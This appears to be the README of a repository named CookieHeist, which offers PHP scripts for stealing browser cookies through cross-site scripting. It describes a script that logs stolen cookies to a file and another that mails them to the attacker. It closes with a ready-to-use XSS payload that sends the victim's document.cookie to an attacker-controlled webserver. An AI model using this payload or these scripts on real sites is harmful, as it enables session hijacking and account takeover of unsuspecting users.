# CookieHeist
PHP Cookie Stealing Scripts for use in XSS

1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string. Then writes value to log.txt and redirects to Google.com.

2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.

#Usage

Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie

XSS Payload Example: <script javascript:text>document.location="http://[Attacker Webserver]?c=" + document.cookie + "&t=Alert"; </script>
